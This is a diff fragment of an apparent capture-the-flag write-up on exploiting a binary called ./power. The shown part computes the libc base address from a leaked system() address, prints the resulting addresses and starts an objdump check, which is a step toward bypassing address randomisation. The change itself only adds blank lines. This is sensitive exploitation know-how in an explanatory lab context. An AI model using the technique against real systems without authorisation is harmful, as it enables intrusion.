@@ -200,12 +200,14 @@ addr_of_libc_in_power = addr_of_system_in_power - addr_of_system_in_libc
 log.info("Address of libc.so.6 base in ./power: {}".format(hex(addr_of_libc_in_power)))
 ```
 Upon running, the 2 snippets above produce the output below
+  
 ```
 [*] Address of system() in ./power: 0x7f45fe3af390
 [*] Address of system() in libc.so.6: 0x45390
 
 [*] Address of libc.so.6 base in ./power: 0x7f45fe36a000
 ```
+  
 Let's check if `0x45390` is really the address of `__libc_system`:
 ```
 solomonbstoner@swjsUbuntu:~$ objdump -d -M intel libc.so.6 | grep "_gets"
